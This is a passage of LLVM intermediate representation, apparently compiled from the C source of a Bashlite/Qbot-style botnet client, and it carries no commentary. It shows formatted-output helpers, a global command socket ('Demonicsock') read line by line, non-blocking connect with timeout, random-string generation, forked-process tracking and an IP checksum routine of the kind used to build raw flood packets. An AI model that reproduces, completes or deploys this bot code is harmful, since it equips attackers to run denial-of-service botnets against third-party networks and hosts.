  %88 = getelementptr i8, i8* %86, i64 %87
  %89 = add i32 %83, 8
  store i32 %89, i32* %11, align 8
  br label %93

; <label>:90:                                     ; preds = %82
  %91 = load i8*, i8** %13, align 8
  %92 = getelementptr i8, i8* %91, i64 8
  store i8* %92, i8** %13, align 8
  br label %93

; <label>:93:                                     ; preds = %90, %85
  %.in3 = phi i8* [ %88, %85 ], [ %91, %90 ]
  %94 = bitcast i8* %.in3 to i32*
  %95 = load i32, i32* %94, align 4
  %96 = tail call fastcc i32 @printi(i8** %0, i32 %95, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  br label %146

; <label>:97:                                     ; preds = %.critedge
  %98 = load i32, i32* %14, align 8
  %99 = icmp ult i32 %98, 41
  br i1 %99, label %100, label %105

; <label>:100:                                    ; preds = %97
  %101 = load i8*, i8** %15, align 8
  %102 = sext i32 %98 to i64
  %103 = getelementptr i8, i8* %101, i64 %102
  %104 = add i32 %98, 8
  store i32 %104, i32* %14, align 8
  br label %108

; <label>:105:                                    ; preds = %97
  %106 = load i8*, i8** %16, align 8
  %107 = getelementptr i8, i8* %106, i64 8
  store i8* %107, i8** %16, align 8
  br label %108

; <label>:108:                                    ; preds = %105, %100
  %.in2 = phi i8* [ %103, %100 ], [ %106, %105 ]
  %109 = bitcast i8* %.in2 to i32*
  %110 = load i32, i32* %109, align 4
  %111 = tail call fastcc i32 @printi(i8** %0, i32 %110, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 65)
  br label %146

; <label>:112:                                    ; preds = %.critedge
  %113 = load i32, i32* %17, align 8
  %114 = icmp ult i32 %113, 41
  br i1 %114, label %115, label %120

; <label>:115:                                    ; preds = %112
  %116 = load i8*, i8** %18, align 8
  %117 = sext i32 %113 to i64
  %118 = getelementptr i8, i8* %116, i64 %117
  %119 = add i32 %113, 8
  store i32 %119, i32* %17, align 8
  br label %123

; <label>:120:                                    ; preds = %112
  %121 = load i8*, i8** %19, align 8
  %122 = getelementptr i8, i8* %121, i64 8
  store i8* %122, i8** %19, align 8
  br label %123

; <label>:123:                                    ; preds = %120, %115
  %.in1 = phi i8* [ %118, %115 ], [ %121, %120 ]
  %124 = bitcast i8* %.in1 to i32*
  %125 = load i32, i32* %124, align 4
  %126 = tail call fastcc i32 @printi(i8** %0, i32 %125, i32 10, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  br label %146

; <label>:127:                                    ; preds = %.critedge
  %128 = load i32, i32* %20, align 8
  %129 = icmp ult i32 %128, 41
  br i1 %129, label %130, label %135

; <label>:130:                                    ; preds = %127
  %131 = load i8*, i8** %21, align 8
  %132 = sext i32 %128 to i64
  %133 = getelementptr i8, i8* %131, i64 %132
  %134 = add i32 %128, 8
  store i32 %134, i32* %20, align 8
  br label %138

; <label>:135:                                    ; preds = %127
  %136 = load i8*, i8** %24, align 8
  %137 = getelementptr i8, i8* %136, i64 8
  store i8* %137, i8** %24, align 8
  br label %138

; <label>:138:                                    ; preds = %135, %130
  %.in = phi i8* [ %133, %130 ], [ %136, %135 ]
  %139 = bitcast i8* %.in to i32*
  %140 = load i32, i32* %139, align 4
  %141 = trunc i32 %140 to i8
  store i8 %141, i8* %22, align 1
  store i8 0, i8* %23, align 1
  %142 = call fastcc i32 @prints(i8** %0, i8* nonnull %22, i32 %.064.lcssa, i32 %.063.lcssa)
  br label %146

; <label>:143:                                    ; preds = %27, %25
  %.3 = phi i8* [ %.0, %25 ], [ %28, %27 ]
  %144 = load i8, i8* %.3, align 1
  %145 = zext i8 %144 to i32
  tail call fastcc void @printchar(i8** %0, i32 %145)
  br label %146

; <label>:146:                                    ; preds = %.critedge, %143, %138, %123, %108, %93, %78, %59
  %.4 = phi i8* [ %.3, %143 ], [ %.2.lcssa, %59 ], [ %.2.lcssa, %78 ], [ %.2.lcssa, %93 ], [ %.2.lcssa, %108 ], [ %.2.lcssa, %123 ], [ %.2.lcssa, %138 ], [ %.2.lcssa, %.critedge ]
  %147 = getelementptr inbounds i8, i8* %.4, i64 1
  br label %25

; <label>:148:                                    ; preds = %27, %25
  %149 = icmp eq i8** %0, null
  br i1 %149, label %152, label %150

; <label>:150:                                    ; preds = %148
  %151 = load i8*, i8** %0, align 8
  store i8 0, i8* %151, align 1
  br label %152

; <label>:152:                                    ; preds = %148, %150
  %153 = bitcast %struct.__va_list_tag* %2 to i8*
  tail call void @llvm.va_end(i8* %153)
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #7

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @prints(i8**, i8* nocapture readonly, i32, i32) unnamed_addr #1 {
  %5 = icmp sgt i32 %2, 0
  br i1 %5, label %.preheader37, label %.thread.preheader

.preheader37:                                     ; preds = %4
  %6 = load i8, i8* %1, align 1
  %7 = icmp eq i8 %6, 0
  br i1 %7, label %._crit_edge48, label %.lr.ph47.preheader

.lr.ph47.preheader:                               ; preds = %.preheader37
  br label %.lr.ph47

.lr.ph47:                                         ; preds = %.lr.ph47.preheader, %.lr.ph47
  %.046 = phi i8* [ %9, %.lr.ph47 ], [ %1, %.lr.ph47.preheader ]
  %.02745 = phi i32 [ %8, %.lr.ph47 ], [ 0, %.lr.ph47.preheader ]
  %8 = add nuw nsw i32 %.02745, 1
  %9 = getelementptr inbounds i8, i8* %.046, i64 1
  %10 = load i8, i8* %9, align 1
  %11 = icmp eq i8 %10, 0
  br i1 %11, label %._crit_edge48.loopexit, label %.lr.ph47

._crit_edge48.loopexit:                           ; preds = %.lr.ph47
  br label %._crit_edge48

._crit_edge48:                                    ; preds = %._crit_edge48.loopexit, %.preheader37
  %.027.lcssa = phi i32 [ 0, %.preheader37 ], [ %8, %._crit_edge48.loopexit ]
  %12 = icmp slt i32 %.027.lcssa, %2
  %13 = sub nsw i32 %2, %.027.lcssa
  %.031 = select i1 %12, i32 %13, i32 0
  %14 = shl i32 %3, 3
  %15 = and i32 %14, 16
  %16 = or i32 %15, 32
  %17 = and i32 %3, 1
  %18 = icmp eq i32 %17, 0
  %19 = icmp sgt i32 %.031, 0
  %or.cond = and i1 %18, %19
  br i1 %or.cond, label %.preheader36.preheader, label %.thread.preheader

.preheader36.preheader:                           ; preds = %._crit_edge48
  br label %.preheader36

.preheader36:                                     ; preds = %.preheader36.preheader, %.preheader36
  %.233 = phi i32 [ %21, %.preheader36 ], [ %13, %.preheader36.preheader ]
  %.029 = phi i32 [ %20, %.preheader36 ], [ 0, %.preheader36.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %16)
  %20 = add nuw nsw i32 %.029, 1
  %21 = add nsw i32 %.233, -1
  %.old1 = icmp sgt i32 %.233, 1
  br i1 %.old1, label %.preheader36, label %.thread.preheader.loopexit

.thread.preheader.loopexit:                       ; preds = %.preheader36
  br label %.thread.preheader

.thread.preheader:                                ; preds = %.thread.preheader.loopexit, %._crit_edge48, %4
  %.02835.ph = phi i32 [ 32, %4 ], [ %16, %._crit_edge48 ], [ %16, %.thread.preheader.loopexit ]
  %.3.ph = phi i32 [ %2, %4 ], [ %.031, %._crit_edge48 ], [ %21, %.thread.preheader.loopexit ]
  %.1.ph = phi i32 [ 0, %4 ], [ 0, %._crit_edge48 ], [ %20, %.thread.preheader.loopexit ]
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %.preheader, label %.thread.preheader65

.thread.preheader65:                              ; preds = %.thread.preheader
  br label %.thread

.preheader.loopexit:                              ; preds = %.thread
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.thread.preheader
  %.1.lcssa = phi i32 [ %.1.ph, %.thread.preheader ], [ %27, %.preheader.loopexit ]
  %24 = icmp sgt i32 %.3.ph, 0
  br i1 %24, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.thread:                                          ; preds = %.thread.preheader65, %.thread
  %25 = phi i8 [ %29, %.thread ], [ %22, %.thread.preheader65 ]
  %.142 = phi i32 [ %27, %.thread ], [ %.1.ph, %.thread.preheader65 ]
  %.03041 = phi i8* [ %28, %.thread ], [ %1, %.thread.preheader65 ]
  %26 = zext i8 %25 to i32
  tail call fastcc void @printchar(i8** %0, i32 %26)
  %27 = add nsw i32 %.142, 1
  %28 = getelementptr inbounds i8, i8* %.03041, i64 1
  %29 = load i8, i8* %28, align 1
  %30 = icmp eq i8 %29, 0
  br i1 %30, label %.preheader.loopexit, label %.thread

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.240 = phi i32 [ %31, %.lr.ph ], [ %.1.lcssa, %.lr.ph.preheader ]
  %.439 = phi i32 [ %32, %.lr.ph ], [ %.3.ph, %.lr.ph.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %.02835.ph)
  %31 = add nsw i32 %.240, 1
  %32 = add nsw i32 %.439, -1
  %33 = icmp sgt i32 %.439, 1
  br i1 %33, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.2.lcssa = phi i32 [ %.1.lcssa, %.preheader ], [ %31, %._crit_edge.loopexit ]
  ret i32 %.2.lcssa
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @printi(i8**, i32, i32, i32, i32, i32, i32) unnamed_addr #1 {
  %8 = alloca [12 x i8], align 1
  %9 = icmp eq i32 %1, 0
  br i1 %9, label %10, label %14

; <label>:10:                                     ; preds = %7
  %11 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 0
  store i8 48, i8* %11, align 1
  %12 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 1
  store i8 0, i8* %12, align 1
  %13 = call fastcc i32 @prints(i8** %0, i8* nonnull %11, i32 %4, i32 %5)
  br label %41

; <label>:14:                                     ; preds = %7
  %15 = icmp ne i32 %3, 0
  %16 = icmp eq i32 %2, 10
  %or.cond = and i1 %16, %15
  %17 = icmp slt i32 %1, 0
  %or.cond3 = and i1 %17, %or.cond
  %18 = sub nsw i32 0, %1
  %19 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 11
  store i8 0, i8* %19, align 1
  %.45 = select i1 %or.cond3, i32 %18, i32 %1
  %20 = icmp eq i32 %.45, 0
  br i1 %20, label %select.unfold._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %14
  %21 = add i32 %6, 198
  br label %select.unfold

select.unfold:                                    ; preds = %.lr.ph, %select.unfold
  %.147 = phi i32 [ %.45, %.lr.ph ], [ %28, %select.unfold ]
  %.03846 = phi i8* [ %19, %.lr.ph ], [ %27, %select.unfold ]
  %22 = urem i32 %.147, %2
  %23 = icmp sgt i32 %22, 9
  %24 = select i1 %23, i32 %21, i32 0
  %.037 = add i32 %22, 48
  %25 = add i32 %.037, %24
  %26 = trunc i32 %25 to i8
  %27 = getelementptr inbounds i8, i8* %.03846, i64 -1
  store i8 %26, i8* %27, align 1
  %28 = udiv i32 %.147, %2
  %29 = icmp ult i32 %.147, %2
  br i1 %29, label %select.unfold._crit_edge.loopexit, label %select.unfold

select.unfold._crit_edge.loopexit:                ; preds = %select.unfold
  br label %select.unfold._crit_edge

select.unfold._crit_edge:                         ; preds = %select.unfold._crit_edge.loopexit, %14
  %.038.lcssa = phi i8* [ %19, %14 ], [ %27, %select.unfold._crit_edge.loopexit ]
  br i1 %or.cond3, label %30, label %38

; <label>:30:                                     ; preds = %select.unfold._crit_edge
  %31 = icmp eq i32 %4, 0
  %32 = and i32 %5, 2
  %33 = icmp eq i32 %32, 0
  %or.cond44 = or i1 %31, %33
  br i1 %or.cond44, label %36, label %34

; <label>:34:                                     ; preds = %30
  tail call fastcc void @printchar(i8** %0, i32 45)
  %35 = add nsw i32 %4, -1
  br label %38

; <label>:36:                                     ; preds = %30
  %37 = getelementptr inbounds i8, i8* %.038.lcssa, i64 -1
  store i8 45, i8* %37, align 1
  br label %38

; <label>:38:                                     ; preds = %select.unfold._crit_edge, %34, %36
  %.041 = phi i32 [ %35, %34 ], [ %4, %36 ], [ %4, %select.unfold._crit_edge ]
  %.139 = phi i8* [ %.038.lcssa, %34 ], [ %37, %36 ], [ %.038.lcssa, %select.unfold._crit_edge ]
  %.035 = phi i32 [ 1, %34 ], [ 0, %36 ], [ 0, %select.unfold._crit_edge ]
  %39 = call fastcc i32 @prints(i8** %0, i8* %.139, i32 %.041, i32 %5)
  %40 = add nsw i32 %39, %.035
  br label %41

; <label>:41:                                     ; preds = %38, %10
  %.040 = phi i32 [ %13, %10 ], [ %40, %38 ]
  ret i32 %.040
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @printchar(i8**, i32) unnamed_addr #1 {
  %3 = alloca i32, align 4
  store i32 %1, i32* %3, align 4
  %4 = icmp eq i8** %0, null
  br i1 %4, label %10, label %5

; <label>:5:                                      ; preds = %2
  %6 = trunc i32 %1 to i8
  %7 = load i8*, i8** %0, align 8
  store i8 %6, i8* %7, align 1
  %8 = load i8*, i8** %0, align 8
  %9 = getelementptr inbounds i8, i8* %8, i64 1
  store i8* %9, i8** %0, align 8
  br label %13

; <label>:10:                                     ; preds = %2
  %11 = bitcast i32* %3 to i8*
  %12 = call i64 @write(i32 1, i8* nonnull %11, i64 1) #7
  br label %13

; <label>:13:                                     ; preds = %10, %5
  ret void
}

declare i64 @write(i32, i8* nocapture readonly, i64) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr* nocapture) local_unnamed_addr #1 {
  %3 = tail call i32 @inet_addr(i8* %0) #7
  %4 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1, i64 0, i32 0
  store i32 %3, i32* %4, align 4
  %5 = icmp eq i32 %3, -1
  %. = zext i1 %5 to i32
  ret i32 %.
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeRandomStr(i8* nocapture, i32) local_unnamed_addr #0 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  %wide.trip.count = zext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %4 = tail call i32 @rand_cmwc()
  %5 = urem i32 %4, 26
  %6 = add nuw nsw i32 %5, 65
  %7 = trunc i32 %6 to i8
  %8 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  store i8 %7, i8* %8, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8* nocapture, i32) local_unnamed_addr #1 {
  %4 = alloca %struct.fd_set, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i8, align 1
  %7 = sext i32 %2 to i64
  tail call void @llvm.memset.p0i8.i64(i8* %1, i8 0, i64 %7, i32 1, i1 false)
  %8 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i64 0, i32 0
  store i64 30, i64* %8, align 8
  %9 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i64 0, i32 1
  store i64 0, i64* %9, align 8
  %10 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %4, i64 0, i32 0, i64 0
  %11 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %10) #7, !srcloc !1
  %12 = srem i32 %0, 64
  %13 = zext i32 %12 to i64
  %14 = shl i64 1, %13
  %15 = sdiv i32 %0, 64
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %4, i64 0, i32 0, i64 %16
  %18 = load i64, i64* %17, align 8
  %19 = or i64 %18, %14
  store i64 %19, i64* %17, align 8
  %20 = add nsw i32 %0, 1
  %21 = call i32 @select(i32 %20, %struct.fd_set* nonnull %4, %struct.fd_set* null, %struct.fd_set* nonnull %4, %struct.timeval* nonnull %5) #7
  %22 = icmp sgt i32 %2, 1
  br i1 %22, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %31
  %.in = phi i32 [ %23, %31 ], [ %2, %.lr.ph.preheader ]
  %.024 = phi i32 [ %32, %31 ], [ 0, %.lr.ph.preheader ]
  %.01923 = phi i8* [ %29, %31 ], [ %1, %.lr.ph.preheader ]
  %23 = add nsw i32 %.in, -1
  %24 = load i32, i32* @Demonicsock, align 4
  %25 = call i64 @recv(i32 %24, i8* nonnull %6, i64 1, i32 0) #7
  %26 = icmp eq i64 %25, 1
  br i1 %26, label %27, label %._crit_edge.loopexit

; <label>:27:                                     ; preds = %.lr.ph
  %28 = load i8, i8* %6, align 1
  %29 = getelementptr inbounds i8, i8* %.01923, i64 1
  store i8 %28, i8* %.01923, align 1
  %30 = icmp eq i8 %28, 10
  br i1 %30, label %._crit_edge.loopexit, label %31

; <label>:31:                                     ; preds = %27
  %32 = add nuw nsw i32 %.024, 1
  %33 = icmp sgt i32 %23, 1
  br i1 %33, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph, %31, %27
  %.1.sink.ph = phi i8* [ %.01923, %.lr.ph ], [ %29, %31 ], [ %29, %27 ]
  %.020.ph = phi i32 [ -1, %.lr.ph ], [ %32, %31 ], [ %.024, %27 ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  %.1.sink = phi i8* [ %1, %3 ], [ %.1.sink.ph, %._crit_edge.loopexit ]
  %.020 = phi i32 [ 0, %3 ], [ %.020.ph, %._crit_edge.loopexit ]
  store i8 0, i8* %.1.sink, align 1
  ret i32 %.020
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) local_unnamed_addr #3

declare i64 @recv(i32, i8*, i64, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) local_unnamed_addr #1 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca %struct.fd_set, align 8
  %7 = alloca %struct.timeval, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #7
  %11 = sext i32 %10 to i64
  %12 = or i64 %11, 2048
  %13 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %12) #7
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  store i16 2, i16* %14, align 4
  %15 = trunc i32 %2 to i16
  %16 = tail call zeroext i16 @htons(i16 zeroext %15) #14
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2
  %19 = call i32 @getHost(i8* %1, %struct.in_addr* %18)
  %20 = icmp eq i32 %19, 0
  br i1 %20, label %21, label %58

; <label>:21:                                     ; preds = %4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 3, i64 0
  %23 = bitcast i8* %22 to i64*
  store i64 0, i64* %23, align 4
  %24 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %25 = call i32 @connect(i32 %0, %struct.sockaddr* nonnull %24, i32 16) #7
  %26 = icmp slt i32 %25, 0
  br i1 %26, label %27, label %53

; <label>:27:                                     ; preds = %21
  %28 = tail call i32* @__errno_location() #14
  %29 = load i32, i32* %28, align 4
  %30 = icmp eq i32 %29, 115
  br i1 %30, label %31, label %58

; <label>:31:                                     ; preds = %27
  %32 = sext i32 %3 to i64
  %33 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 0
  store i64 %32, i64* %33, align 8
  %34 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 1
  store i64 0, i64* %34, align 8
  %35 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i64 0, i32 0, i64 0
  %36 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %35) #7, !srcloc !2
  %37 = srem i32 %0, 64
  %38 = zext i32 %37 to i64
  %39 = shl i64 1, %38
  %40 = sdiv i32 %0, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i64 0, i32 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %39
  store i64 %44, i64* %42, align 8
  %45 = add nsw i32 %0, 1
  %46 = call i32 @select(i32 %45, %struct.fd_set* null, %struct.fd_set* nonnull %6, %struct.fd_set* null, %struct.timeval* nonnull %7) #7
  %47 = icmp sgt i32 %46, 0
  br i1 %47, label %48, label %58

; <label>:48:                                     ; preds = %31
  store i32 4, i32* %8, align 4
  %49 = bitcast i32* %9 to i8*
  %50 = call i32 @getsockopt(i32 %0, i32 1, i32 4, i8* nonnull %49, i32* nonnull %8) #7
  %51 = load i32, i32* %9, align 4
  %52 = icmp eq i32 %51, 0
  br i1 %52, label %53, label %58

; <label>:53:                                     ; preds = %48, %21
  %54 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #7
  %55 = sext i32 %54 to i64
  %56 = and i64 %55, -2049
  %57 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %56) #7
  br label %58

; <label>:58:                                     ; preds = %27, %31, %48, %4, %53
  %.0 = phi i32 [ 1, %53 ], [ 0, %4 ], [ 0, %48 ], [ 0, %31 ], [ 0, %27 ]
  ret i32 %.0
}

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() local_unnamed_addr #1 {
  %1 = tail call i32 @fork() #7
  %2 = icmp eq i32 %1, 0
  br i1 %2, label %23, label %3

; <label>:3:                                      ; preds = %0
  %4 = load i64, i64* @numpids, align 8
  %5 = add i64 %4, 1
  store i64 %5, i64* @numpids, align 8
  %6 = shl i64 %4, 2
  %7 = add i64 %6, 8
  %8 = tail call noalias i8* @malloc(i64 %7) #7
  %9 = bitcast i8* %8 to i32*
  %10 = icmp eq i64 %4, 0
  br i1 %10, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %11 = phi i64 [ %17, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.012 = phi i32 [ %16, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %12 = load i32*, i32** @pids, align 8
  %13 = getelementptr inbounds i32, i32* %12, i64 %11
  %14 = load i32, i32* %13, align 4
  %15 = getelementptr inbounds i32, i32* %9, i64 %11
  store i32 %14, i32* %15, align 4
  %16 = add i32 %.012, 1
  %17 = zext i32 %16 to i64
  %18 = load i64, i64* @numpids, align 8
  %19 = add i64 %18, -1
  %20 = icmp ult i64 %17, %19
  br i1 %20, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  %.lcssa = phi i64 [ 0, %3 ], [ %19, %._crit_edge.loopexit ]
  %21 = getelementptr inbounds i32, i32* %9, i64 %.lcssa
  store i32 %1, i32* %21, align 4
  %22 = load i8*, i8** bitcast (i32** @pids to i8**), align 8
  tail call void @free(i8* %22) #7
  store i8* %8, i8** bitcast (i32** @pids to i8**), align 8
  br label %23

; <label>:23:                                     ; preds = %0, %._crit_edge
  ret i32 %1
}

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #4

; Function Attrs: noinline norecurse nounwind readonly uwtable
define zeroext i16 @csum(i16* nocapture readonly, i32) local_unnamed_addr #8 {
  %3 = icmp sgt i32 %1, 1
  br i1 %3, label %.lr.ph16.preheader, label %._crit_edge17

.lr.ph16.preheader:                               ; preds = %2
  %4 = add i32 %1, -2
  %5 = lshr i32 %4, 1
  %addconv = add nuw i32 %5, 1
  %6 = zext i32 %addconv to i64
  %7 = shl nuw i32 %5, 1
  %xtraiter = and i32 %addconv, 3
  %lcmp.mod = icmp eq i32 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph16.prol.loopexit, label %.lr.ph16.prol.preheader

.lr.ph16.prol.preheader:                          ; preds = %.lr.ph16.preheader
  br label %.lr.ph16.prol

.lr.ph16.prol:                                    ; preds = %.lr.ph16.prol, %.lr.ph16.prol.preheader
  %.014.prol = phi i64 [ %11, %.lr.ph16.prol ], [ 0, %.lr.ph16.prol.preheader ]
  %.0913.prol = phi i32 [ %12, %.lr.ph16.prol ], [ %1, %.lr.ph16.prol.preheader ]
  %.01012.prol = phi i16* [ %8, %.lr.ph16.prol ], [ %0, %.lr.ph16.prol.preheader ]
  %prol.iter = phi i32 [ %prol.iter.sub, %.lr.ph16.prol ], [ %xtraiter, %.lr.ph16.prol.preheader ]
  %8 = getelementptr inbounds i16, i16* %.01012.prol, i64 1
  %9 = load i16, i16* %.01012.prol, align 2
  %10 = zext i16 %9 to i64
  %11 = add i64 %10, %.014.prol
  %12 = add nsw i32 %.0913.prol, -2
  %prol.iter.sub = add i32 %prol.iter, -1
  %prol.iter.cmp = icmp eq i32 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.lr.ph16.prol.loopexit.unr-lcssa, label %.lr.ph16.prol, !llvm.loop !3

.lr.ph16.prol.loopexit.unr-lcssa:                 ; preds = %.lr.ph16.prol
  br label %.lr.ph16.prol.loopexit

.lr.ph16.prol.loopexit:                           ; preds = %.lr.ph16.preheader, %.lr.ph16.prol.loopexit.unr-lcssa
  %.014.unr = phi i64 [ 0, %.lr.ph16.preheader ], [ %11, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %.0913.unr = phi i32 [ %1, %.lr.ph16.preheader ], [ %12, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %.01012.unr = phi i16* [ %0, %.lr.ph16.preheader ], [ %8, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %.lcssa26.unr = phi i64 [ undef, %.lr.ph16.preheader ], [ %11, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %13 = icmp ult i32 %4, 6
  br i1 %13, label %._crit_edge17.loopexit, label %.lr.ph16.preheader.new

.lr.ph16.preheader.new:                           ; preds = %.lr.ph16.prol.loopexit
  br label %.lr.ph16

.lr.ph16:                                         ; preds = %.lr.ph16, %.lr.ph16.preheader.new
  %.014 = phi i64 [ %.014.unr, %.lr.ph16.preheader.new ], [ %29, %.lr.ph16 ]
  %.0913 = phi i32 [ %.0913.unr, %.lr.ph16.preheader.new ], [ %30, %.lr.ph16 ]
  %.01012 = phi i16* [ %.01012.unr, %.lr.ph16.preheader.new ], [ %26, %.lr.ph16 ]
  %14 = getelementptr inbounds i16, i16* %.01012, i64 1
  %15 = load i16, i16* %.01012, align 2
  %16 = zext i16 %15 to i64
  %17 = add i64 %16, %.014
  %18 = getelementptr inbounds i16, i16* %.01012, i64 2
  %19 = load i16, i16* %14, align 2
  %20 = zext i16 %19 to i64
  %21 = add i64 %20, %17
  %22 = getelementptr inbounds i16, i16* %.01012, i64 3
  %23 = load i16, i16* %18, align 2
  %24 = zext i16 %23 to i64
  %25 = add i64 %24, %21
  %26 = getelementptr inbounds i16, i16* %.01012, i64 4
  %27 = load i16, i16* %22, align 2
  %28 = zext i16 %27 to i64
  %29 = add i64 %28, %25
  %30 = add nsw i32 %.0913, -8
  %31 = icmp sgt i32 %30, 1
  br i1 %31, label %.lr.ph16, label %._crit_edge17.loopexit.unr-lcssa

._crit_edge17.loopexit.unr-lcssa:                 ; preds = %.lr.ph16
  br label %._crit_edge17.loopexit

._crit_edge17.loopexit:                           ; preds = %.lr.ph16.prol.loopexit, %._crit_edge17.loopexit.unr-lcssa
  %.lcssa26 = phi i64 [ %.lcssa26.unr, %.lr.ph16.prol.loopexit ], [ %29, %._crit_edge17.loopexit.unr-lcssa ]
  %scevgep = getelementptr i16, i16* %0, i64 %6
  %32 = sub i32 %4, %7
  br label %._crit_edge17

._crit_edge17:                                    ; preds = %._crit_edge17.loopexit, %2
  %.010.lcssa = phi i16* [ %0, %2 ], [ %scevgep, %._crit_edge17.loopexit ]
  %.09.lcssa = phi i32 [ %1, %2 ], [ %32, %._crit_edge17.loopexit ]
  %.0.lcssa = phi i64 [ 0, %2 ], [ %.lcssa26, %._crit_edge17.loopexit ]
  %33 = icmp eq i32 %.09.lcssa, 1
  br i1 %33, label %34, label %.preheader

; <label>:34:                                     ; preds = %._crit_edge17
  %35 = bitcast i16* %.010.lcssa to i8*
  %36 = load i8, i8* %35, align 1
  %37 = zext i8 %36 to i64
